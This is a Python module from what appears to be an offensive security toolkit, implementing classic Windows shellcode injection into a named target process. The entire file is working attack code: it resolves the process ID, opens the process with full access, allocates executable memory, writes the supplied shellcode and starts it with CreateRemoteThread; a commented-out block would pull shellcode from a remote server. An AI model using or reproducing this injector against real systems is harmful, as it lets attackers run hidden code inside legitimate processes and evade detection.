import utils.arg
import os
import ctypes

from utils.helper import nstate as nstate

class inject:
    from ctypes import windll
    from ctypes import wintypes
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00'
    Description = 'Inject shellcode to process'
    Version = '1.0.0'
    Target_Process = ''
    Shellcode = ''
    StartProcess = False

    def init():
        spName = 'inject'
        spArgList = [
            ['-i', '--input', '', '', 'Input file for process injection'],
            ['-p', '--process', '', '', 'Processname to inject the shellcode'],
            ['-s', '--start', '', 'store_true', 'If not active, start the process before injection']
            ]
        utils.arg.CreateSubParser(spName, inject.Description, spArgList)

    def Start_Process():
        tp = inject.Target_Process
        print(f'{nstate.OKBLUE} starting {tp}')
        os.system(tp)

    def get_proc_id():
        processes = inject.wmi.WMI().Win32_Process(name=inject.Target_Process)
        
        pid = processes[0].ProcessId
        print(f"{nstate.OKGREEN} {inject.Target_Process} process id: {pid}")
        
        return int(pid)
    
    # response = request.urlopen(args.server)
    # shellcode = response.read()

    # if shellcode:
    #   print(f'[*] retrieved the shellcode from {args.server}')

    def start_injection():
        if inject.StartProcess:
            s = inject.threading.Thread(target=inject.Start_Process)
            s.start()
            inject.sleep(3)
        kernel32 = inject.windll.kernel32
        # constants
        MEM_COMMIT_RESERVE = 0x3000
        PAGE_READWRITE_EXECUTE = 0x40
        PROCESS_ALL_ACCESS = 0x1fffff
        EXECUTE_IMMEDIATLY = 0

        # Function type redefintions
        OpenProcess = kernel32.OpenProcess
        OpenProcess.argtypes = [inject.wintypes.DWORD,inject.wintypes.BOOL,inject.wintypes.DWORD]
        OpenProcess.restype = inject.wintypes.HANDLE

        VirtualAllocEx = kernel32.VirtualAllocEx
        VirtualAllocEx.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, ctypes.c_size_t, inject.wintypes.DWORD,inject.wintypes.DWORD]
        VirtualAllocEx.restype = inject.wintypes.LPVOID

        WriteProcessMemory = kernel32.WriteProcessMemory
        WriteProcessMemory.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, inject.wintypes.LPCVOID, ctypes.c_size_t, inject.wintypes.LPVOID]
        WriteProcessMemory.restype = inject.wintypes.BOOL

        CreateRemoteThread = kernel32.CreateRemoteThread
        CreateRemoteThread.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, ctypes.c_size_t, inject.wintypes.LPVOID, inject.wintypes.LPVOID, inject.wintypes.DWORD, inject.wintypes.LPDWORD]
        CreateRemoteThread.restype = inject.wintypes.HANDLE

        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [inject.wintypes.HANDLE]
        CloseHandle.restype = inject.wintypes.BOOL
        process_id = inject.get_proc_id()

        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            print(f"{nstate.OKGREEN} Opened a Handle to the process")

        memory = VirtualAllocEx(phandle, None, len(inject.Shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            print(f'{nstate.OKGREEN} Allocated Memory in the process')

        c_null = ctypes.c_int(0)
        writing = WriteProcessMemory(phandle, memory, inject.Shellcode, len(inject.Shellcode), ctypes.byref(c_null))
        if writing:
            print(f'{nstate.OKGREEN} Wrote The shellcode to memory')

        Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            print(f'{nstate.OKGREEN} Injected the shellcode into the process')
        CloseHandle(phandle)

    def proc_inject():
        return False